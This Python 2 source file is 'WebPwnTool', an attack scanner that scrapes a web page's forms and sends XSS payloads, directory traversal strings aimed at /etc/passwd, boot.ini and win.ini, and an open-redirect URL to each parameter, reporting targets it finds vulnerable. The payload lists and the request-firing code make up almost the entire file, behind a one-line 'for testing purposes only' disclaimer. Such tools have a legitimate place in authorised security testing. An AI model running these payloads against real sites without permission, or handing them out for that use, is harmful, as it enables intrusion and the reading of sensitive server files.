#! python
###############################################
#   WebPwnTool                                #
#   Author: malwrforensics                    #
#   Contact: malwr at malwrforensics dot com  #
###############################################

import sys
import os
import requests
import re

DEBUG = 0

cmd_opt_xss         = "--checkxss"
cmd_opt_dirtrv      = "--checkdirtrv"
cmd_opt_openredir   = "--checkopenredir"
cmd_opt_all         = "--all"

xss_attacks = [ '<script>alert(1);</script>', "<script>prompt(1)</script>",
                '<img src=x onerror=prompt(/test/)>',
                '><script>alert(1);</script><div id="x', '</script><script>alert(1);</script>',
                '</title><script>alert(1);</script>', '<body background="javascript:alert(1)">',
                '<img src=test123456.jpg onerror=alert(1)>', '";</script><scrIpt>prompt(1)</scrIpt><"']

dir_traversal_attacks = []
dir_traversal_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin', '; for 16-bit app support']

openredir_attacks = ['http://www.malwrforensics.com']
openredir_expect = ['malwr (at) malwrforensics . com']

def generate_dir_traversal_attacks():
    global dir_traversal_attacks
    for i in range(2,10):
        #linux
        dir_traversal_attacks.append('../' * i + 'etc/passwd')
        dir_traversal_attacks.append('../' * i + 'etc/passwd%00')
        dir_traversal_attacks.append('%2e%2e%2f' * i + 'etc%2fpasswd')
        dir_traversal_attacks.append('%2e%2e%2f' * i + 'etc%2fpasswd%00')

        #windows
        dir_traversal_attacks.append('../' * i + 'boot.ini')
        dir_traversal_attacks.append('../' * i + 'boot.ini%00')
        dir_traversal_attacks.append('%2e%2e%2f' * i + 'boot.ini')
        dir_traversal_attacks.append('%2e%2e%2f' * i + 'boot.ini%00')
        dir_traversal_attacks.append('..%5f' * i + 'boot.ini')
        dir_traversal_attacks.append('..%5f' * i + 'boot.ini%00')
        dir_traversal_attacks.append('%2e%2e%5f' * i + 'boot.ini')
        dir_traversal_attacks.append('%2e%2e%5f' * i + 'boot.ini%00')

        dir_traversal_attacks.append('../' * i + 'windows/win.ini')
        dir_traversal_attacks.append('../' * i + 'windows/win.ini%00')
        dir_traversal_attacks.append('%2e%2e%2f' * i + 'windows%2fwin.ini')
        dir_traversal_attacks.append('%2e%2e%2f' * i + 'windows%2fwin.ini%00')
        dir_traversal_attacks.append('..%5f' * i + 'windows%5fwin.ini')
        dir_traversal_attacks.append('..%5f' * i + 'windows%5fwin.ini%00')
        dir_traversal_attacks.append('%2e%2e%5f' * i + 'windows%5fwin.ini')
        dir_traversal_attacks.append('%2e%2e%5f' * i + 'windows%5fwin.ini%00')

def check_attack(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url, attack_type):
    global DEBUG
    attack_values = []
    attack_expect = []

    if page.find("http://") == 0 or page.find("https://") == 0:
        furl = page
    else:
        if _url.find("https://") == 0:
            furl = "https://" + host + "/" + page
        else:
            furl = "http://" + host + "/" + page

    if attack_type.find(cmd_opt_xss) == 0:
        print "[+] XSS check for: " + furl
        attack_values = xss_attacks
        attack_expect = xss_attacks

    if attack_type.find(cmd_opt_dirtrv) == 0:
        print "[+] Directory traversal/LFI check for: " + furl
        attack_values = dir_traversal_attacks
        attack_expect = dir_traversal_expect

    if attack_type.find(cmd_opt_openredir) == 0:
        print "[+] Open redirect check for: " + furl
        attack_values = openredir_attacks
        attack_expect = openredir_expect

    if DEBUG == 1:
        print "Params: "
        print params
        print hidden_param_name
        print hidden_param_value

    counter = 0
    for attack in attack_values:
        post_params={}
        counter+=1
        parameters = ""
        for i in range(0,len(params)):
            for j in range(0, len(params)):
                if j==i:
                    post_params[params[j]] = attack
                else:
                    post_params[params[j]] = 0

            #add any hidden parameters
            if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):
                for i in range(0,len(hidden_param_name)):
                    post_params[hidden_param_name[i]] = hidden_param_value[i]

        if len(post_params) == 0:
            post_params[0] = attack
            r=requests.get(url = _url + attack)
            if DEBUG == 1:
                print "Result URL: " + r.url
        else:
            if method.find("get") == 0:
                r=requests.get(url = furl, params = post_params)
            else:
                r=requests.post(furl, data=post_params)

        if DEBUG == 1:
            print post_params
            with open("response_" + str(form_counter) + "_" + str(counter) + ".html", "w") as f:
                f.write(r.content)

        for attack_result in attack_expect:
            if r.content.find(attack_result)>=0:
                print "[+] Target is VULNERABLE"
                print "Url: " + url
                print "Parameters: %s\n" % str(post_params)

                #comment out the return if you want all the findings
                return 1

    return 0

def scan_for_forms(fname, host, url, scanopt):
    print "[+] Start scan"
    rtype=""
    has_form=0
    params = []
    hidden_param_name=[]
    hidden_param_value=[]
    page = ""
    form_counter = 0

    try:
        with open(fname, "r") as f:
            for line in f:

                #now that we've collected all the parameters
                #let's check if the page is vulnerable
                if line.find("</form>") >=0:
                    has_form=0
                    if len(page) > 0 and (len(params) > 0 or len(hidden_param_value) > 0):
                        if scanopt.find(cmd_opt_xss) == 0 or scanopt.find("--all") == 0:
                            check_attack(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url, cmd_opt_xss)
                        if scanopt.find(cmd_opt_dirtrv) == 0 or scanopt.find("--all") == 0:
                            check_attack(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url, cmd_opt_dirtrv)
                        if scanopt.find(cmd_opt_openredir) == 0 or scanopt.find("--all") == 0:
                            check_attack(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url, cmd_opt_openredir)

                        params=[]
                        hidden_param_name=[]
                        hidden_param_value=[]
                        page=""

                #add input parameters to list
                if has_form == 1:
                    m_input = re.match(r'.*\<(input|button)\s[^\>]*name=["\'](\w+)["\']', line, re.M|re.I)
                    if m_input:
                        #check if the parameters already has a value assigned
                        m_value = re.match(r'.*\<(input|button)\s[^\>]*value=["\'](\w+)["\']', line, re.M|re.I)
                        if m_value:
                            hidden_param_name.append(m_input.group(2))
                            hidden_param_value.append(m_value.group(2))
                        else:
                            params.append(m_input.group(2))

                #detect forms
                m_same      = re.match(r'.*\<form\>', line, re.M|re.I)
                m_action    = re.match(r'.*\<form\s[^\>]*action=["\']([\w\/\.\-\#\:]+)["\']', line, re.M|re.I)
                m_reqtype   = re.match(r'.*\<form\s[^\>]*method=["\']([\w\/\.\-]+)["\']', line, re.M|re.I)
                if m_action or m_same:
                    has_form=1
                    form_counter+=1
                    if m_same:
                        page=""
                    else:
                        page=m_action.group(1)
                    rtype="get"
                    if m_reqtype:
                        rtype=m_reqtype.group(1)
                    print "[+] Form detected. Method " + rtype.upper()

    except Exception, e:
        print "[-] scan_for_forms(): Error " + str(e)

        #enable the following lines if you want more details
        #exc_type, exc_obj, exc_tb = sys.exc_info()
        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        #print(exc_type, fname, exc_tb.tb_lineno)

    return

def help():
    print cmd_opt_xss + "\t\tcheck webpage for XSS vunerabilities"
    print cmd_opt_dirtrv + "\t\tcheck webpage for directory traversal/local file inclusion (LFI) vulnerabilities"
    print cmd_opt_openredir + "\tcheck webpage for open redirect vunerabilities"
    print cmd_opt_all + "\t\t\tthe tool will scan for XSS, directory traversal/LFI, open redirect vulnerabilities (default)"
    print "\nExamples:"
    print "program http://example.com/guestbook\t\t\tit will check for all vulnerabilities (XSS/LFI/openredir/etc)"
    print "program " + cmd_opt_xss + " http://example.com/guestbook\t\tit will check only for XSS"

###MAIN###
if __name__ == "__main__":
    print "WebPwnTool v1.2"
    print "DISCLAIMER: For testing purposes only!\n"

    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print "program [scan options] [url]\n"
        help()
        exit()

    scanopt = cmd_opt_all
    url = ""

    if sys.argv[1].find("http") == 0:
        url = sys.argv[1]
        if len(sys.argv) == 3:
            scanopt = sys.argv[2]
    else:
        if len(sys.argv) == 3:
            if sys.argv[1].find("--check") == 0:
                scanopt = sys.argv[1]
                url = sys.argv[2]

    if url.find("http") != 0:
        print "[-] Invalid target"
        exit()

    m=re.match(r'(http|https):\/\/([^\/]+)', url, re.I|re.M)
    if m:
        host = m.group(2)
    else:
        print "[-] Can't get host information"
        exit()

    print "[+] Host acquired " + host

    #generate LFI attack data (urls)
    generate_dir_traversal_attacks()

    print "[+] Retrieve page"
    try:
        r = requests.get(url)
        s = r.content.replace(">", ">\n")

        #good to have a local copy for testing
        with open("tmpage.txt", "w") as f:
            f.write(s)

        scan_for_forms("tmpage.txt", host, url, scanopt)

        #check for LFI even if there are no forms
        if scanopt.find(cmd_opt_dirtrv) == 0 or scanopt.find(cmd_opt_all) == 0:
            check_attack(host, url, "get", "", "", "", 0, url, cmd_opt_dirtrv)

        if scanopt.find(cmd_opt_openredir) == 0 or scanopt.find(cmd_opt_all) == 0:
            check_attack(host, url, "get", "", "", "", 0, url, cmd_opt_openredir)

        if DEBUG == 0:
            os.remove("tmpage.txt")
    except Exception, e:
        print "[-] Main(): Error " + str(e)

print "[*] Done"
